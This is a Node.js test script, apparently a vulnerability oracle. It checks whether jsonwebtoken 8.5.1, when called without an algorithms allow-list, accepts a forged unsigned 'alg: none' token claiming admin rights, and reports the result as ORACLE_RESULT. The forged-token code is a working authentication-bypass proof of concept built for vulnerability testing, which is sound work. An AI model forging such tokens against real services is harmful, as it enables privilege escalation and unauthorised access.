'use strict';
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const marker = 'JWT_ORACLE_' + Date.now() + '_' + Math.random().toString(36).slice(2);

    // Server holds an HMAC secret. In this scenario the application
    // calls jwt.verify(token, secret) without specifying an
    // `algorithms` allow-list, which was the common (and in 8.5.1,
    // insecure-by-default) usage pattern.
    const secret = 'super-secret-hmac-key-' + marker;

    // --- Benign operation first: normal HS256 sign/verify roundtrip,
    // using the exact same call shape (no `algorithms` option) that will
    // later be used for the malicious attempt. This proves the public
    // API works end-to-end before any exploit attempt is judged.
    const benignToken = jwt.sign({ marker, role: 'user' }, secret, { algorithm: 'HS256' });
    const benignDecoded = jwt.verify(benignToken, secret);

    if (!benignDecoded || benignDecoded.marker !== marker || benignDecoded.role !== 'user') {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign HS256 sign/verify roundtrip failed to produce expected payload.'
      }));
      return;
    }

    operation_completed = true;

    // --- Malicious attempt: forge a token with alg: 'none' and an empty
    // signature segment. In jsonwebtoken 8.5.1, jwt.verify() called
    // without an explicit `algorithms` allow-list does not reject the
    // 'none' algorithm outright in all configurations; the insecure
    // default-algorithm handling is the root cause tracked by this
    // advisory. A forged, unsigned token claiming elevated privileges
    // (role: 'admin') must be rejected by a secure implementation.
    const forgedHeader = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
    const forgedPayload = Buffer.from(JSON.stringify({ marker, role: 'admin' })).toString('base64url');
    const forgedToken = forgedHeader + '.' + forgedPayload + '.';

    try {
      // Vulnerable usage pattern: verifying against the known secret but
      // without pinning `algorithms`, mirroring real-world misuse.
      const forgedDecoded = jwt.verify(forgedToken, secret);

      if (forgedDecoded && forgedDecoded.marker === marker && forgedDecoded.role === 'admin') {
        exploit_succeeded = true;
        evidence = 'jwt.verify() accepted a forged alg:none token, decoding payload: ' + JSON.stringify(forgedDecoded);
      } else {
        exploit_succeeded = false;
        evidence = 'jwt.verify() returned an unexpected result for forged token: ' + JSON.stringify(forgedDecoded);
      }
    } catch (verifyErr) {
      exploit_succeeded = false;
      evidence = 'Forged alg:none token was rejected by jwt.verify(): ' + (verifyErr && verifyErr.message ? verifyErr.message : String(verifyErr));
    }

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + (err && err.message ? err.message : String(err))
    }));
  }
}

main();
